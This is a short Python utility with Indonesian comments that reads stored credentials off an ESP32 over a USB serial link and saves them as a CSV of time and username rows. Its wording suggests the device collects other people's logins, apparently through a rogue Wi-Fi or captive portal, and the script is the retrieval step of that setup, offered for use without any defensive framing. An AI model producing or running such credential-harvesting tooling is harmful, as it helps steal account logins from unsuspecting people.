#!/usr/bin/env python3
"""Tarik kredensial dari ESP32 lewat kabel USB (tanpa nyambung ke Wi-Fi-nya).
Pakai:  python3 pull_creds.py [port] [outfile]
Contoh: python3 pull_creds.py /dev/ttyUSB0 creds.csv
"""
import sys, time, serial

port = sys.argv[1] if len(sys.argv) > 1 else "/dev/ttyUSB0"
out  = sys.argv[2] if len(sys.argv) > 2 else "creds.csv"

try:
    s = serial.Serial(port, 115200, timeout=2)
except Exception as e:
    print(f"[!] gagal buka {port}: {e}\n    pastikan tidak ada 'pio device monitor' / serial_log.py jalan")
    sys.exit(1)

time.sleep(0.4)
s.reset_input_buffer()
s.write(b"csv\n")
s.flush()

rows, t = [], time.time()
while time.time() - t < 30:
    raw = s.readline()
    if not raw:
        continue
    line = raw.decode("utf-8", "replace").rstrip("\r\n")
    if "###END###" in line:
        break
    if line.startswith("[") or not line.strip():
        continue
    if line.startswith("waktu,username"):
        rows.insert(0, line)
        continue
    rows.append(line)

if not rows or len(rows) == 1:
    print("[i] belum ada kredensial tersimpan.")
else:
    with open(out, "w", encoding="utf-8") as f:
        f.write("\n".join(rows) + "\n")
    print(f"[+] {len(rows)-1} entri -> {out}")
s.close()
